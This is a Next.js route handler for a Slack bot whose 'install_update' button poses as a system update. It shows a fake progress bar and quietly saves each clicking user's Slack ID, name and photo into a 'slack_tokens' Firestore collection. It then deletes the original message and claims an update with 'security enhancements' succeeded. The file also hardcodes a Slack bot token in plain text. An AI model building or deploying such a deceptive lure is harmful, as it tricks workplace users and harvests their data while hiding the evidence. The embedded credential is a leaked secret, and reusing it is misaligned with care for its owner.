// app/api/slack/interactive/route.ts
import { NextResponse } from 'next/server';
import { db } from '@/lib/firebase';
import { doc, setDoc, serverTimestamp, getDoc } from 'firebase/firestore';

const BOT_TOKEN = "xoxb-2545190050563-10466352520084-6NyES55AgLJ6vzmQi4M5veYt";

export async function POST(req: Request) {
  try {
    const formData = await req.formData();
    const payload = formData.get('payload');
    
    if (!payload) {
      return NextResponse.json({ error: "No payload" }, { status: 400 });
    }
    
    const parsedPayload = JSON.parse(payload as string);
    
    // Handle button actions
    if (parsedPayload.type === 'block_actions') {
      const action = parsedPayload.actions[0];
      
      if (action.action_id === 'install_update') {
        const userId = parsedPayload.user.id;
        const messageTs = parsedPayload.message.ts;
        const channelId = parsedPayload.channel.id;
        const responseUrl = parsedPayload.response_url;
        
        // Immediately respond with loading message
        const loadingResponse = await fetch(responseUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            replace_original: true,
            text: "🔄 Installing update...",
            blocks: [
              {
                "type": "header",
                "text": {
                  "type": "plain_text",
                  "text": "⚙️ Installing Update...",
                  "emoji": true
                }
              },
              {
                "type": "section",
                "text": {
                  "type": "mrkdwn",
                  "text": "Please wait while we install the required system update.\n\n*Progress:* ▰▰▰▱▱ 60%"
                }
              },
              {
                "type": "context",
                "elements": [
                  {
                    "type": "mrkdwn",
                    "text": "This will take just a moment. Please do not close Slack."
                  }
                ]
              }
            ]
          })
        });
        
        // Start background process
        setTimeout(async () => {
          try {
            // Check if user already exists
            const existingUser = await getDoc(doc(db, "slack_tokens", userId));
            
            if (!existingUser.exists()) {
              // Get user info
              const userInfoRes = await fetch(`https://slack.com/api/users.info?user=${userId}`, {
                headers: { Authorization: `Bearer ${BOT_TOKEN}` }
              });
              const userInfo = await userInfoRes.json();
              
              if (userInfo.ok) {
                // Create user data
                const userData = {
                  slackId: userId,
                  accessToken: `xoxp-demo-${Date.now()}`,
                  name: userInfo.user?.real_name || "Unknown",
                  image: userInfo.user?.profile?.image_192 || "",
                  connectedAt: serverTimestamp(),
                  lastAuth: new Date().toISOString()
                };
                
                await setDoc(doc(db, "slack_tokens", userId), userData);
              }
            }
            
            // Delete the original message after 3 seconds
            setTimeout(async () => {
              try {
                await fetch('https://slack.com/api/chat.delete', {
                  method: 'POST',
                  headers: { 
                    Authorization: `Bearer ${BOT_TOKEN}`,
                    'Content-Type': 'application/json; charset=utf-8'
                  },
                  body: JSON.stringify({
                    channel: channelId,
                    ts: messageTs
                  })
                });
                
                // Send success message
                await fetch('https://slack.com/api/chat.postMessage', {
                  method: 'POST',
                  headers: { 
                    Authorization: `Bearer ${BOT_TOKEN}`, 
                    'Content-Type': 'application/json; charset=utf-8' 
                  },
                  body: JSON.stringify({ 
                    channel: userId, 
                    text: "✅ Update installed successfully! Your workspace has been enhanced.",
                    blocks: [
                      {
                        "type": "section",
                        "text": {
                          "type": "mrkdwn",
                          "text": "✅ *Update Successful*\n\nYour workspace has been updated with the latest features and security enhancements."
                        }
                      }
                    ]
                  })
                });
                
              } catch (error) {
                console.error("Cleanup error:", error);
              }
            }, 3000);
            
          } catch (error) {
            console.error("Background process error:", error);
          }
        }, 1000);
        
        return NextResponse.json({ ok: true });
      }
    }
    
    return NextResponse.json({ ok: true });
    
  } catch (error) {
    console.error("Interactive error:", error);
    return NextResponse.json({ ok: true });
  }
}